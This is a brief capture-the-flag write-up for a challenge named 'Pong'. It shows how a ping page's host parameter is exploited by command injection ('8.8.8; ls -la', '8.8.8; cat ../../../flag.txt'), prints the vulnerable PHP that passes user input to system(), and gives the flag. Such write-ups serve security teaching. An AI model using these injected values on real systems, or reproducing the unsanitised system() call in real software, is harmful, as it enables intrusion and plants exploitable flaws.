# Pong

### 50 Points

## Information
    Author: skyv3il

    Some random website that can ping hosts.
    What's the flag ?


 

## Steps done

1 - We visited the url and it returned the message `Command executed: ping -c 2 127.0.0.1` 
2 - After some tries, we sent the query parameter host with value 8.8.8.8 `?host=8.8.8` and the response was `Command executed: ping -c 2 8.8.8.8`
3 - After it we tried to inject a command `ls -la` `?host=8.8.8; ls -la` and the reponse contained the directory listing, with the php file 

    <pre><?php


    if(isset($_GET['host'])){
        echo "<pre>";
        system("ping -c 2 " . $_GET['host']);
        echo "</pre>";
    }
    else{
        header('Location: '.$_SERVER['PHP_SELF']."?host=127.0.0.1");
    die;
    }

4 - We checked upper directories with `ls -la ../` and we found a file called flag.txt on  `../../../flag.txt`
5 - We printed the content of the file with `?host=8.8.8; cat ../../../flag.txt` and we obtained the flag  `TFCCTF{C0mm4nd_1nj3c5i0n_1s_E4sy}`
